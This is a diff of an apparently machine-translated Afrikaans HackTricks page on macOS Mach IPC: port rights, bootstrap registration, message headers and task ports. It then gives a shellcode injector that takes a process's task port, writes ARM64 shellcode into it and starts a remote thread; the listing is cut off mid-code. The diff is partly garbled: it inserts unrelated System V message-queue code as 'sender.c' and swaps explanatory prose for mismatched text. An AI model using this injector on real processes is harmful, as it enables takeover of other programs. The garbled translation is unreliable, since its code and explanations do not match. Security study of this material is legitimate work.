@@ -1,4 +1,4 @@
-# macOS IPC - Inter Process Communication
+# macOS IPC - Interproses Kommunikasie
 
 <details>
 
@@ -6,7 +6,7 @@
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -20,29 +20,29 @@ Ander maniere om HackTricks te ondersteun:
 
 Mach gebruik **take** as die **kleinste eenheid** vir die deel van hulpbronne, en elke taak kan **meervoudige drade** bevat. Hierdie **take en drade word 1:1 gekarteer na POSIX-prosesse en drade**.
 
-Kommunikasie tussen take vind plaas via Mach Inter-Process Communication (IPC), wat eenrigting kommunikasiekanale benut. **Boodskappe word oorgedra tussen poorte**, wat optree soos **boodskapresies** wat deur die kernel bestuur word.
+Kommunikasie tussen take vind plaas via Mach Interproses Kommunikasie (IPC), wat eenrigting kommunikasiekanaal benut. **Boodskappe word oorgedra tussen poorte**, wat optree soos **boodskap-queues** wat deur die kernel bestuur word.
 
-Elke proses het 'n **IPC-tabel**, waarin dit moontlik is om die **mach-poorte van die proses** te vind. Die naam van 'n mach-poort is eintlik 'n nommer (‘n wyser na die kernelobjek).
+Elke proses het 'n **IPC-tabel**, waarin dit moontlik is om die **mach-poorte van die proses** te vind. Die naam van 'n mach-poort is eintlik 'n nommer (‘n wyser na die kernel-objek).
 
-'n Proses kan ook 'n poortnaam met sekere regte **na 'n ander taak stuur** en die kernel sal hierdie inskrywing in die **IPC-tabel van die ander taak laat verskyn**.
+'n Proses kan ook 'n poortnaam met sekere regte **na 'n ander taak stuur** en die kernel sal hierdie inskrywing in die **IPC-tabel van die ander taak** laat verskyn.
 
 ### Poortregte
 
 Poortregte, wat definieer watter operasies 'n taak kan uitvoer, is sleutel tot hierdie kommunikasie. Die moontlike **poortregte** is ([definisies vanaf hier](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):
 
-* **Ontvangsreg**, wat die ontvangs van boodskappe wat na die poort gestuur is, moontlik maak. Mach-poorte is MPSC (meervoudige-vervaardiger, enkel-verbruiker) rye, wat beteken dat daar slegs **een ontvangsreg vir elke poort** in die hele stelsel kan wees (in teenstelling met pype, waar meervoudige prosesse almal lêerbeskrywers na die lees-einde van een pyp kan hê).
-* 'n **Taak met die Ontvangsreg** kan boodskappe ontvang en **Sendregte skep**, wat dit moontlik maak om boodskappe te stuur. Oorspronklik het slegs die **eie taak 'n Ontvangsreg oor sy poort**.
-* **Sendreg**, wat dit moontlik maak om boodskappe na die poort te stuur.
-* Die Sendreg kan **gekloneer** word sodat 'n taak wat 'n Sendreg besit, die reg kan kloon en dit aan 'n derde taak kan **toeken**.
-* **Send-once reg**, wat dit moontlik maak om een boodskap na die poort te stuur en dan te verdwyn.
-* **Poortstelreg**, wat 'n _poortstel_ aandui eerder as 'n enkele poort. Dequeuing 'n boodskap van 'n poortstel dequeues 'n boodskap van een van die poorte wat dit bevat. Poortstelle kan gebruik word om op verskeie poorte gelyktydig te luister, soos `select`/`poll`/`epoll`/`kqueue` in Unix.
+* **Ontvangsreg**, wat die ontvangs van boodskappe wat na die poort gestuur is, toelaat. Mach-poorte is MPSC (meervoudige-vervaardiger, enkel-verbruiker) rye, wat beteken dat daar slegs **een ontvangsreg vir elke poort** in die hele stelsel kan wees (in teenstelling met pype, waar meervoudige prosesse almal lêerbeskrywers na die lees-einde van een pyp kan hê).
+* 'n **Taak met die Ontvangsreg** kan boodskappe ontvang en **Send-regte skep**, wat dit moontlik maak om boodskappe te stuur. Aanvanklik het slegs die **eie taak Ontvangsreg oor sy poort**.
+* **Stuur-reg**, wat dit moontlik maak om boodskappe na die poort te stuur.
+* Die Stuur-reg kan **gekloneer** word sodat 'n taak wat 'n Stuur-reg besit, die reg kan kloon en dit aan 'n derde taak kan **toeken**.
+* **Eenkeer-stuur-reg**, wat dit moontlik maak om een boodskap na die poort te stuur en dan te verdwyn.
+* **Poortstelreg**, wat 'n _poortstel_ aandui eerder as 'n enkele poort. Die uitkering van 'n boodskap van 'n poortstel onttrek 'n boodskap van een van die poorte wat dit bevat. Poortstelle kan gebruik word om gelyktydig na verskeie poorte te luister, soos `select`/`poll`/`epoll`/`kqueue` in Unix.
 * **Dooie naam**, wat nie 'n werklike poortreg is nie, maar bloot 'n plasing. Wanneer 'n poort vernietig word, verander alle bestaande poortregte na die poort in dooie name.
 
-**Take kan SEND-regte aan ander oordra**, wat hulle in staat stel om boodskappe terug te stuur. **SEND-regte kan ook gekloneer word, sodat 'n taak die reg kan dupliseer en dit aan 'n derde taak kan gee**. Hierdie, saam met 'n tussenliggende proses wat bekend staan as die **bootstrap-bediener**, maak effektiewe kommunikasie tussen take moontlik.
+**Take kan SEND-regte na ander oordra**, wat hulle in staat stel om boodskappe terug te stuur. **SEND-regte kan ook gekloneer word, sodat 'n taak die reg kan dupliseer en dit aan 'n derde taak kan gee**. Hierdie, saam met 'n tussenliggende proses wat bekend staan as die **bootstrap-bediener**, maak effektiewe kommunikasie tussen take moontlik.
 
 ### Lêerpoorte
 
-Lêerpoorte maak dit moontlik om lêerbeskrywers in Mac-poorte in te sluit (deur Mach-poortregte te gebruik). Dit is moontlik om 'n `fileport` vanaf 'n gegewe FD te skep deur `fileport_makeport` te gebruik en 'n FD vanaf 'n lêerpoort te skep deur `fileport_makefd` te gebruik.
+Lêerpoorte maak dit moontlik om lêerbeskrywers in Mac-poorte in te sluit (deur Mach-poortregte te gebruik). Dit is moontlik om 'n `fileport` van 'n gegewe FD te skep deur `fileport_makeport` te gebruik en 'n FD van 'n lêerpoort te skep deur `fileport_makefd` te gebruik.
 
 ### Die vestiging van 'n kommunikasie
 
@@ -51,32 +51,31 @@ Lêerpoorte maak dit moontlik om lêerbeskrywers in Mac-poorte in te sluit (deur
 Soos genoem, om die kommunikasiekanaal te vestig, is die **bootstrap-bediener** (**launchd** in Mac) betrokke.
 
 1. Taak **A** inisieer 'n **nuwe poort**, wat 'n **ONTVANGS-reg** in die proses verkry.
-2. Taak **A**, as die houer van die ONTVANGS-reg, **skep 'n SEND-reg vir die poort**.
-3. Taak **A** vestig 'n **verbindings** met die **bootstrap-bediener**, deur die **diensnaam van die poort** en die **SEND-reg** te voorsien deur 'n prosedure wat bekend staan as die bootstrap-registrasie.
-4. Taak **B** interaksie met die **bootstrap-bediener** om 'n bootstrap **opsoek na die diensnaam** uit te voer. Indien suksesvol, **dupliseer die bediener die SEND-reg** wat van Taak A ontvang is en **stuur dit na Taak B**.
-5. Nadat Taak **B** 'n SEND-reg verkry het, is dit in staat om 'n **boodskap te formuleer** en dit **na Taak A te stuur**.
-6. Vir 'n tweerigting kommunikasie skep taak **B** gewoonlik 'n nuwe poort met 'n **ONTVANGS**-reg en 'n **SEND**-reg, en gee die **SEND-reg aan Taak A** sodat dit boodskappe aan TAASK B kan stuur (tweerigting kommunikasie).
+2. Taak **A**, as die houer van die ONTVANGS-reg, **skep 'n STUUR-reg vir die poort**.
+3. Taak **A** vestig 'n **verbindings** met die **bootstrap-bediener**, deur die **diensnaam van die poort** en die **STUUR-reg** deur 'n prosedure bekend as die bootstrap-registrasie te voorsien.
+4. Taak **B** interaksie met die **bootstrap-bediener** om 'n bootstrap **soektog vir die diensnaam** uit te voer. Indien suksesvol, **dupliseer die bediener die STUUR-reg** wat van Taak A ontvang is en **stuur dit na Taak B**.
+5. Nadat Taak **B** 'n STUUR-reg verkry het, is dit in staat om 'n **boodskap te formuleer** en dit **na Taak A te stuur**.
+6. Vir 'n tweerigting kommunikasie genereer taak **B** gewoonlik 'n nuwe poort met 'n **ONTVANGS**-reg en 'n **STUUR**-reg, en gee die **STUUR-reg aan Taak A** sodat dit boodskappe aan Taak B kan stuur (tweerigting kommunikasie).
 
-Die bootstrap-bediener **kan nie die diensnaam autentiseer** wat deur 'n taak beweer word nie. Dit beteken 'n **taak** kan moontlik **enige stelseltaak voorgee**, soos vals **beweer 'n outorisasiediensnaam** en dan elke versoek goedkeur.
+Die bootstrap-bediener **kan nie die diensnaam autentiseer** wat deur 'n taak beweer word nie. Dit beteken 'n **taak** kan potensieel enige stelseltaak **impersoneer**, soos valse **goedkeuring van 'n outorisasiediensnaam** en dan elke versoek goedkeur.
 
-Dan stoor Apple die **name van stelselverskafte dienste** in veilige konfigurasie lêers, geleë in **SIP-beskermde** gids: `/System/Library/LaunchDaemons` en `/System/Library/LaunchAgents`. Saam met elke diensnaam word ook die **geassosieerde binêre lêer gestoor**. Die bootstrap-bediener, sal 'n **ONTVANGS-reg vir elkeen van hierdie diensname** skep en behou.
+Dan stoor Apple die **name van stelselverskafde dienste** in veilige konfigurasie lêers, geleë in **SIP-beskermde** gids: `/System/Library/LaunchDaemons` en `/System/Library/LaunchAgents`. Saam met elke diensnaam word ook die **geassosieerde binêre lêer gestoor**. Die bootstrap-bediener, sal 'n **ONTVANGS-reg vir elkeen van hierdie diensname** skep en behou.
 
-Vir hierdie voorgedefinieerde dienste, verskil die **opsoekproses effens**. Wanneer 'n diensnaam opgesoek word, begin launchd die diens dinamies. Die nuwe werkstroom is as volg:
+Vir hierdie voorgedefinieerde dienste, verskil die **soektogproses effens**. Wanneer 'n diensnaam opgesoek word, begin launchd die diens dinamies. Die nuwe werkstroom is as volg:
 
-* Taak **B** inisieer 'n bootstrap **opsoek** vir 'n diensnaam.
+* Taak **B** inisieer 'n bootstrap **soektog** vir 'n diensnaam.
 * **launchd** kyk of die taak loop en indien nie, **begin** dit.
-* Taak **A** (die diens) voer 'n **bootstrap-inligting** uit. Hier skep die **bootstrap**-bediener 'n SEND-reg, behou dit, en **oorhandig die ONTVANGS-reg aan Taak A**.
-* launchd dupliseer die **SEND-reg en stuur dit na Taak B**.
-* Taak **B** skep 'n nuwe poort met 'n **ONTVANGS**-reg en 'n **SEND**-reg, en gee die **SEND-reg aan Taak A** (die diens) sodat dit boodskappe aan TAASK B kan stuur (tweerigting kommunikasie).
+* Taak **A** (die diens) voer 'n **bootstrap-inligting** uit. Hier skep die **bootstrap**-bediener 'n STUUR-reg, behou dit, en **oorhandig die ONTVANGS-reg aan Taak A**.
+* launchd dupliseer die **STUUR-reg en stuur dit na Taak B**.
+* Taak **B** genereer 'n nuwe poort met 'n **ONTVANGS**-reg en 'n **STUUR**-reg, en gee die **STUUR-reg aan Taak A** (die diens) sodat dit boodskappe aan Taak B kan stuur (tweerigting kommunikasie).
 
-Hierdie proses geld egter slegs vir voorgedefinieerde stelseltake. Nie-stelsel take werk steeds soos aanvanklik beskryf, wat moontlik die moontlikheid van voorgee toelaat.
+Hierdie proses geld egter slegs vir voorgedefinieerde stelseltake. Nie-stelsel take werk steeds soos aanvanklik beskryf, wat potensieel impersoneering moontlik maak.
 
 ### 'n Mach-boodskap
 
 [Vind meer inligting hier](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
 
-Die `mach_msg`-funksie, essensieel 'n stelseloproep, word gebruik vir die stuur en ontvang van Mach-boodskappe. Die funksie vereis dat die boodskap as die aanvanklike argument gestuur word. Hierdie boodskap moet begin met 'n `mach_msg_header_t`-struktuur, gevolg deur die werklike boodskapinhoud. Die struktuur word soos volg gedefinieer:
-
+Die `mach_msg`-funksie, in wese 'n stelseloproep, word gebruik vir die stuur en ontvang van Mach-boodskappe. Die funksie vereis dat die boodskap as die aanvanklike argument gestuur word. Hierdie boodskap moet begin met 'n `mach_msg_header_t`-struktuur, gevolg deur die werklike boodskapinhoud. Die struktuur word soos volg gedefinieer:
 ```c
 typedef struct {
 mach_msg_bits_t               msgh_bits;
@@ -87,10 +86,9 @@ mach_port_name_t              msgh_voucher_port;
 mach_msg_id_t                 msgh_id;
 } mach_msg_header_t;
 ```
+Prosesse wat 'n _**ontvangsreg**_ besit, kan boodskappe op 'n Mach-poort ontvang. Omgekeerd word aan die **senders** 'n _**stuur**_ of 'n _**stuur-eenmaal-reg**_ toegeken. Die stuur-eenmaal-reg is uitsluitlik vir die stuur van 'n enkele boodskap, waarna dit ongeldig word.
 
-Prosesse wat 'n _**ontvangsreg**_ besit, kan boodskappe op 'n Mach-poort ontvang. Omgekeerd word aan die **senders** 'n _**stuur**_ of 'n _**stuur-eenmaal reg**_ toegeken. Die stuur-eenmaal reg is uitsluitlik vir die stuur van 'n enkele boodskap, waarna dit ongeldig word.
-
-Om 'n maklike **tweerigting kommunikasie** te bereik, kan 'n proses 'n **mach-poort** spesifiseer in die mach **boodskap kop** genaamd die _antwoordpoort_ (**`msgh_local_port`**) waar die **ontvanger** van die boodskap 'n antwoord op hierdie boodskap kan stuur. Die bivlae in **`msgh_bits`** kan gebruik word om aan te dui dat 'n **stuur-eenmaal reg** afgelei en oorgedra moet word vir hierdie poort (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).
+Om 'n maklike **tweerigting kommunikasie** te bereik, kan 'n proses 'n **mach-poort** spesifiseer in die mach **boodskap kop** genaamd die _antwoordpoort_ (**`msgh_local_port`**) waar die **ontvanger** van die boodskap 'n antwoord op hierdie boodskap kan stuur. Die bivlae in **`msgh_bits`** kan gebruik word om aan te dui dat 'n **stuur-eenmaal-reg** afgelei en oorgedra moet word vir hierdie poort (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).
 
 {% hint style="success" %}
 Let daarop dat hierdie soort tweerigting kommunikasie gebruik word in XPC-boodskappe wat 'n antwoord verwag (`xpc_connection_send_message_with_reply` en `xpc_connection_send_message_with_reply_sync`). Maar **gewoonlik word verskillende poorte geskep** soos voorheen verduidelik om die tweerigting kommunikasie te skep.
@@ -104,21 +102,21 @@ Die ander velde van die boodskap kop is:
 * `msgh_id`: die ID van hierdie boodskap, wat deur die ontvanger geïnterpreteer word.
 
 {% hint style="danger" %}
-Let daarop dat **mach-boodskappe oor 'n \_mach-poort** gestuur word, wat 'n **enkele ontvanger**, **veelvuldige sender** kommunikasiekanaal is wat in die mach-kernel ingebou is. **Meer as een proses** kan **boodskappe stuur** na 'n mach-poort, maar op enige punt kan slegs **'n enkele proses daarvan lees**.
+Let daarop dat **mach-boodskappe oor 'n \_mach-poort** gestuur word, wat 'n **enkele ontvanger**, **veelvuldige sender** kommunikasiekanaal is wat in die mach-kernel ingebou is. **Meerdere prosesse** kan **boodskappe stuur** na 'n mach-poort, maar op enige punt kan slegs **'n enkele proses daarvan lees**.
 {% endhint %}
 
-### Enumereer poorte
-
+### Enumerateer poorte
 ```bash
 lsmp -p <pid>
 ```
-
 Jy kan hierdie instrument in iOS installeer deur dit af te laai vanaf [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)
 
 ### Kodevoorbeeld
 
 Merk op hoe die **sender** 'n poort toewys, 'n **send right** skep vir die naam `org.darlinghq.example` en dit na die **bootstrap server** stuur terwyl die sender vir die **send right** van daardie naam gevra het en dit gebruik het om 'n boodskap te stuur.
 
+{% tabs %}
+{% tab title="receiver.c" %}
 ```c
 // Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
 // gcc receiver.c -o receiver
@@ -184,13 +182,47 @@ message.some_text[9] = 0;
 printf("Text: %s, number: %d\n", message.some_text, message.some_number);
 }
 ```
+{% endtab %}
 
-#### Afrikaans Translation
+{% tab title="sender.c" %}  
+### Afrikaans Translation
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
 
-Hierdie is 'n eenvoudige voorbeeld van 'n sender-program wat 'n boodskap stuur na 'n ander program deur gebruik te maak van IPC-meganismes soos `mach_msg`.\
-Die sender-program skep 'n nuwe boodskap, stel die nodige velde in, en stuur die boodskap na die ander program.\
-Dit is belangrik om te verseker dat die korrekte permissies en veiligheidsmaatreëls ingestel is om te voorkom dat ongemagtigde toegang tot IPC-meganismes verkry word.
+#define MAX_MSG_SIZE 80
 
+struct msg_buffer {
+    long msg_type;
+    char msg_text[MAX_MSG_SIZE];
+};
+
+int main() {
+    key_t key;
+    int msg_id;
+    struct msg_buffer message;
+
+    key = ftok("sender.c", 65);
+    msg_id = msgget(key, 0666 | IPC_CREAT);
+
+    message.msg_type = 1;
+
+    printf("Enter message to send: ");
+    fgets(message.msg_text, MAX_MSG_SIZE, stdin);
+
+    msgsnd(msg_id, &message, sizeof(message), 0);
+
+    printf("Data sent is: %s\n", message.msg_text);
+
+    return 0;
+}
+```  
+{% endtab %}
 ```c
 // Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
 // gcc sender.c -o sender
@@ -242,7 +274,6 @@ return 1;
 printf("Sent a message\n");
 }
 ```
-
 ### Bevoorregte Porte
 
 * **Gasheerpoort**: As 'n proses **Stuur**-bevoegdheid oor hierdie poort het, kan hy **inligting** oor die **sisteem** kry (bv. `host_processor_info`).
@@ -250,7 +281,7 @@ printf("Sent a message\n");
 * Verder, om die **`kext_request`** API te roep, is dit nodig om ander toekennings **`com.apple.private.kext*`** te hê wat slegs aan Apple-binêre lêers gegee word.
 * **Taaknaampoort:** 'n Onbevoorregte weergawe van die _taakpoort_. Dit verwys na die taak, maar laat nie toe om dit te beheer nie. Die enigste ding wat beskikbaar lyk deur dit is `task_info()`.
 * **Taakpoort** (ook bekend as kernpoort)**:** Met Stuur-toestemming oor hierdie poort is dit moontlik om die taak te beheer (lees/skryf geheue, skep drade...).
-* Roep `mach_task_self()` aan om die naam vir hierdie poort vir die aanroeperstaak te **kry**. Hierdie poort word slegs **oorgeërf** oor **`exec()`**; 'n nuwe taak wat met `fork()` geskep is, kry 'n nuwe taakpoort (as 'n spesiale geval kry 'n taak ook 'n nuwe taakpoort na `exec()` in 'n suid-binêre lêer). Die enigste manier om 'n taak te skep en sy poort te kry, is om die ["poortruil dans"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) uit te voer terwyl 'n `fork()` gedoen word.
+* Roep `mach_task_self()` aan om die naam vir hierdie poort vir die aanroeperstaak te **kry**. Hierdie poort word slegs **oorgeërf** oor **`exec()`**; 'n nuwe taak wat geskep is met `fork()` kry 'n nuwe taakpoort (as 'n spesiale geval, kry 'n taak ook 'n nuwe taakpoort na `exec()` in 'n suid-binêre lêer). Die enigste manier om 'n taak te skep en sy poort te kry, is om die ["poortruil dans"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) uit te voer terwyl 'n `fork()` gedoen word.
 * Hierdie is die beperkings om toegang tot die poort te verkry (vanaf `macos_task_policy` van die binêre lêer `AppleMobileFileIntegrity`):
 * As die program die **`com.apple.security.get-task-allow` toekennings** het, kan prosesse van dieselfde gebruiker toegang tot die taakpoort kry (gewoonlik bygevoeg deur Xcode vir foutopsporing). Die **notariseringsproses** sal dit nie toelaat vir produksie vrystellings nie.
 * Programme met die **`com.apple.system-task-ports` toekennings** kan die taakpoort vir enige proses kry, behalwe die kernel. In ouer weergawes was dit genoem **`task_for_pid-allow`**. Dit word slegs aan Apple-toepassings toegeken.
@@ -264,6 +295,8 @@ Jy kan 'n shellcode kry van:
 [arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
 {% endcontent-ref %}
 
+{% tabs %}
+{% tab title="mysleep.m" %}
 ```objectivec
 // clang -framework Foundation mysleep.m -o mysleep
 // codesign --entitlements entitlements.plist -s - mysleep
@@ -293,25 +326,13 @@ performMathOperations();  // Silent action
 return 0;
 }
 ```
+{% endtab %}
 
-#### MacOS IPC (Inter-Process Communication)
+{% tab title="entitlements.plist" %}  
+### Toestemmingslêer
 
-Inter-process communication (IPC) is a mechanism that allows processes to communicate and share data with each other. MacOS provides several IPC mechanisms, including Mach ports, XPC services, and distributed notifications.
-
-**Mach Ports**
-
-Mach ports are low-level communication endpoints used by processes to send messages to each other. They are used by various system services and applications for inter-process communication.
-
-**XPC Services**
-
-XPC services are a higher-level IPC mechanism that allows applications to create and manage lightweight processes for executing specific tasks. XPC services are commonly used for tasks that need to be performed in a separate process for security or stability reasons.
-
-**Distributed Notifications**
-
-Distributed notifications allow processes to broadcast and receive notifications across the system. This mechanism is often used for system-wide events or to notify applications of changes in the system state.
-
-Understanding these IPC mechanisms is essential for developers and security professionals to design secure and efficient applications on MacOS. By leveraging these mechanisms properly, developers can ensure that their applications communicate effectively while maintaining the security and integrity of the system.
-
+Hierdie lêer bevat spesifieke toestemmings wat aan die toepassing toegeken is om sekere aksies uit te voer op die macOS-stelsel.  
+{% endtab %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -321,114 +342,556 @@ Understanding these IPC mechanisms is essential for developers and security prof
 </dict>
 </plist>
 ```
+{% endtab %}
+{% endtabs %}
 
 **Kompileer** die vorige program en voeg die **toestemmings** by om kode in te spuit met dieselfde gebruiker (as nie, sal jy **sudo** moet gebruik).
 
 <details>
 
 <summary>sc_injector.m</summary>
+```objectivec
+// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
 
-\`\`\`objectivec // gcc -framework Foundation -framework Appkit sc\_injector.m -o sc\_injector
+#import <Foundation/Foundation.h>
+#import <AppKit/AppKit.h>
+#include <mach/mach_vm.h>
+#include <sys/sysctl.h>
 
-\#import \<Foundation/Foundation.h> #import \<AppKit/AppKit.h> #include \<mach/mach\_vm.h> #include \<sys/sysctl.h>
 
-\#ifdef **arm64**
+#ifdef __arm64__
 
-kern\_return\_t mach\_vm\_allocate ( vm\_map\_t target, mach\_vm\_address\_t \*address, mach\_vm\_size\_t size, int flags );
+kern_return_t mach_vm_allocate
+(
+vm_map_t target,
+mach_vm_address_t *address,
+mach_vm_size_t size,
+int flags
+);
 
-kern\_return\_t mach\_vm\_write ( vm\_map\_t target\_task, mach\_vm\_address\_t address, vm\_offset\_t data, mach\_msg\_type\_number\_t dataCnt );
+kern_return_t mach_vm_write
+(
+vm_map_t target_task,
+mach_vm_address_t address,
+vm_offset_t data,
+mach_msg_type_number_t dataCnt
+);
 
-\#else #include \<mach/mach\_vm.h> #endif
 
-\#define STACK\_SIZE 65536 #define CODE\_SIZE 128
+#else
+#include <mach/mach_vm.h>
+#endif
 
-// ARM64 shellcode that executes touch /tmp/lalala char injectedCode\[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";
 
-int inject(pid\_t pid){
+#define STACK_SIZE 65536
+#define CODE_SIZE 128
 
-task\_t remoteTask;
+// ARM64 shellcode that executes touch /tmp/lalala
+char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";
 
-// Get access to the task port of the process we want to inject into kern\_return\_t kr = task\_for\_pid(mach\_task\_self(), pid, \&remoteTask); if (kr != KERN\_SUCCESS) { fprintf (stderr, "Unable to call task\_for\_pid on pid %d: %d. Cannot continue!\n",pid, kr); return (-1); } else{ printf("Gathered privileges over the task port of process: %d\n", pid); }
 
-// Allocate memory for the stack mach\_vm\_address\_t remoteStack64 = (vm\_address\_t) NULL; mach\_vm\_address\_t remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate(remoteTask, \&remoteStack64, STACK\_SIZE, VM\_FLAGS\_ANYWHERE);
+int inject(pid_t pid){
 
-if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach\_error\_string(kr)); return (-2); } else {
+task_t remoteTask;
 
-fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64); }
+// Get access to the task port of the process we want to inject into
+kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+if (kr != KERN_SUCCESS) {
+fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+return (-1);
+}
+else{
+printf("Gathered privileges over the task port of process: %d\n", pid);
+}
 
-// Allocate memory for the code remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate( remoteTask, \&remoteCode64, CODE\_SIZE, VM\_FLAGS\_ANYWHERE );
+// Allocate memory for the stack
+mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
 
-if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach\_error\_string(kr)); return (-2); }
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+else
+{
 
-// Write the shellcode to the allocated memory kr = mach\_vm\_write(remoteTask, // Task port remoteCode64, // Virtual Address (Destination) (vm\_address\_t) injectedCode, // Source 0xa9); // Length of the source
+fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+}
 
-if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach\_error\_string(kr)); return (-3); }
+// Allocate memory for the code
+remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
 
-// Set the permissions on the allocated code memory kr = vm\_protect(remoteTask, remoteCode64, 0x70, FALSE, VM\_PROT\_READ | VM\_PROT\_EXECUTE);
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
 
-if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach\_error\_string(kr)); return (-4); }
 
-// Set the permissions on the allocated stack memory kr = vm\_protect(remoteTask, remoteStack64, STACK\_SIZE, TRUE, VM\_PROT\_READ | VM\_PROT\_WRITE);
+// Write the shellcode to the allocated memory
+kr = mach_vm_write(remoteTask,                   // Task port
+remoteCode64,                 // Virtual Address (Destination)
+(vm_address_t) injectedCode,  // Source
+0xa9);                       // Length of the source
 
-if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach\_error\_string(kr)); return (-4); }
 
-// Create thread to run shellcode struct arm\_unified\_thread\_state remoteThreadState64; thread\_act\_t remoteThread;
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+return (-3);
+}
 
-memset(\&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
 
-remoteStack64 += (STACK\_SIZE / 2); // this is the real stack //remoteStack64 -= 8; // need alignment of 16
+// Set the permissions on the allocated code memory
+kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
 
-const char\* p = (const char\*) remoteCode64;
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
+return (-4);
+}
 
-remoteThreadState64.ash.flavor = ARM\_THREAD\_STATE64; remoteThreadState64.ash.count = ARM\_THREAD\_STATE64\_COUNT; remoteThreadState64.ts\_64.\_\_pc = (u\_int64\_t) remoteCode64; remoteThreadState64.ts\_64.\_\_sp = (u\_int64\_t) remoteStack64;
+// Set the permissions on the allocated stack memory
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
 
-printf ("Remote Stack 64 0x%llx, Remote code is %p\n", remoteStack64, p );
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
+return (-4);
+}
 
-kr = thread\_create\_running(remoteTask, ARM\_THREAD\_STATE64, // ARM\_THREAD\_STATE64, (thread\_state\_t) \&remoteThreadState64.ts\_64, ARM\_THREAD\_STATE64\_COUNT , \&remoteThread );
+// Create thread to run shellcode
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;
 
-if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to create remote thread: error %s", mach\_error\_string (kr)); return (-3); }
+memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
 
